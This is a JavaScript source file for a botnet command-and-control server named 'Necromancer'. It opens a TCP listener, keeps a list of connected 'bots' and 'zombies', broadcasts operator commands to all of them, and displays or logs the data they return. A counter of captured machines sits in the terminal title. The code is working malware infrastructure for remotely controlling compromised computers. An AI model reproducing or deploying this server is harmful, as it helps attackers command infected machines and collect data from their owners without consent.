import net from "net";
import { prompt, saveFile } from "./commands.js";
import dotenv from "dotenv";

dotenv.config({ path: "../../config/.env" });

let clients, clientInstances, silent, logging;

const clientModules = {
	clients: (clients = []),
	clientInstances: clientInstances,
	silent: (silent = false),
	logging: (logging = false),
};

const PORT = process.env.PORT;
const IP = process.env.IP;

function setTerminalTitle() {
	process.title = `Necromancer | Zombies: ${clients.length}`;
}

function broadcast(message) {
	for (const client of clientModules.clientInstances) {
		client.write(message);
	}
}

net.createServer((socket) => {
	socket.name = `${socket.remoteAddress}:${socket.remotePort}`;

	clientModules.clients.push(socket);
	clientModules.clientInstances = [...clientModules.clients];
	setTerminalTitle();

	console.log(`\n\x1b[91mBot ${socket.name} has connected.\x1b[0m`);

	prompt();

	socket.on("data", (data) => {
		const dataStr = data.toString();

		if (!clientModules.silent) {
			console.log(`\n\x1b[33m[BOT ${socket.name}]\x1b[0m ` + data);
		}
		if (clientModules.logging) {
			saveFile(data);
		}
		prompt();
	});

	socket.on("end", () => {
		clientDisconnected();
	});

	socket.on("error", () => {
		clientDisconnected();
	});

	function clientDisconnected() {
		clientModules.clients.splice(clientModules.clients.indexOf(socket), 1);
		clientModules.clientInstances = [...clientModules.clients];
		console.log(`\x1b[91m\nBot ${socket.name} has disconnected.\x1b[0m`);
		if (clients.length < 1)
			console.log("\x1b[91mWaiting for clients to connect.\x1b[0m");
		setTerminalTitle();
	}
}).listen(PORT, IP);

setTerminalTitle();
console.clear();
console.log(`\x1b[31m
 ███▄    █  ▄████▄   ██▀███   ███▄ ▄███▓ ███▄    █  ▄████▄   ██▀███  
 ██ ▀█   █ ▒██▀ ▀█  ▓██ ▒ ██▒▓██▒▀█▀ ██▒ ██ ▀█   █ ▒██▀ ▀█  ▓██ ▒ ██▒
▓██  ▀█ ██▒▒▓█    ▄ ▓██ ░▄█ ▒▓██    ▓██░▓██  ▀█ ██▒▒▓█    ▄ ▓██ ░▄█ ▒
▓██▒  ▐▌██▒▒▓▓▄ ▄██▒▒██▀▀█▄  ▒██    ▒██ ▓██▒  ▐▌██▒▒▓▓▄ ▄██▒▒██▀▀█▄  
▒██░   ▓██░▒ ▓███▀ ░░██▓ ▒██▒▒██▒   ░██▒▒██░   ▓██░▒ ▓███▀ ░░██▓ ▒██▒
░ ▒░   ▒ ▒ ░ ░▒ ▒  ░░ ▒▓ ░▒▓░░ ▒░   ░  ░░ ▒░   ▒ ▒ ░ ░▒ ▒  ░░ ▒▓ ░▒▓░
░ ░░   ░ ▒░  ░  ▒     ░▒ ░ ▒░░  ░      ░░ ░░   ░ ▒░  ░  ▒     ░▒ ░ ▒░
   ░   ░ ░ ░          ░░   ░ ░      ░      ░   ░ ░ ░          ░░   ░ 
         ░ ░ ░         ░            ░            ░ ░ ░         ░     
           ░                                       ░                
\x1b[0m`);
console.log(`\x1b[91mServer running on ${IP}:${PORT}.\x1b[0m`);
console.log("\x1b[91mWaiting for connections.\x1b[0m");

export { clientModules, broadcast };
